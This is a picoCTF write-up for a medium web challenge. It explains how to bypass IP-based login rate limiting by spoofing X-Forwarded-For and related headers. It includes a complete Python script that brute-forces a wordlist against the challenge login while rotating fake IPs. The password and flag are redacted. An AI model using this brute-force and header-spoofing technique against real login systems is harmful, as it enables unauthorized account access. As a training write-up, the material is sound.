# PicoCTF - Crack the gate 2 Write-up:

Category: Rate Limit Bypass (Web)
Dificulty: Medium

## 1. Reconnaissance & Initial Enumeration
The objective of this challenge was to brute-force a login portal for the user `ctf-player@picoctf.org` using a provided wordlist of 20 passwords. 

However, the application implemented a basic rate-limiting mechanism designed to lock out repeated failed authentication attempts originating from the same IP address. A hint provided in the challenge description suggested that the system might "trust user-controlled headers."

---

## 2. Traffic Analysis
Before launching an attack, I captured a manual login attempt using the browser's Developer Tools (Network tab) to understand how the frontend communicates with the backend.

**Key Observations:**
* **Endpoint:** The form submits a `POST` request to `http://amiable-citadel.picoctf.net:52383/login`.
* **Payload Type:** Instead of traditional URL-encoded form data, the application expects a JSON payload: `{"email": "...", "password": "..."}`.
* **Server Response:** Failed attempts return a raw JSON response (`{"success":false}`), which the frontend JavaScript interprets to display an "Invalid credentials" alert.

---

## 3. Exploitation: IP Spoofing & Automation
Since the backend rate limiter relies on the user's IP address, I suspected it was improperly trusting HTTP headers commonly used by proxies and load balancers to pass along client IPs. 

To bypass the restriction, I developed a custom Python script to automate the brute-force attack. For every password in the wordlist, the script:
1. Generates a randomized, fake IPv4 address.
2. Injects this fake IP into headers like `X-Forwarded-For`, `X-Real-IP`, `Client-IP`, and `True-Client-IP`.
3. Submits the JSON payload to the `/login` endpoint.

By rotating the spoofed IP address on every single request, the server treated each attempt as originating from a completely different user, effectively rendering the rate limit useless.

**The Exploit Script:**
```python
import requests
import random

url = "http://amiable-citadel.picoctf.net:52383/login"
username = "ctf-player@picoctf.org"
wordlist_path = "passwords.txt"

def generate_fake_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

with open(wordlist_path, "r") as file:
    passwords = file.read().splitlines()

for password in passwords:
    fake_ip = generate_fake_ip()
    headers = {
        "X-Forwarded-For": fake_ip,
        "X-Real-IP": fake_ip,
        "Client-IP": fake_ip,
        "True-Client-IP": fake_ip
    }
    payload = {"email": username, "password": password}
    
    response = requests.post(url, headers=headers, json=payload)
    
    if "false" not in response.text or "picoCTF{" in response.text:
        print(f"\n[+] SUCCESS! Password found: {password}")
        print(f"[+] Server Response: {response.text}")
        break
```

---

## 4. Execution & Flag Recovery
Executing the script resulted in an immediate successful bypass of the rate limiter. The script iterated through the wordlist and successfully authenticated.

**Results:**
* **Valid Password:** `*******`
* **Server Response:** `{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{****************************}"}`

The application returned a `success: true` boolean along with the hidden flag embedded directly within the JSON response object.
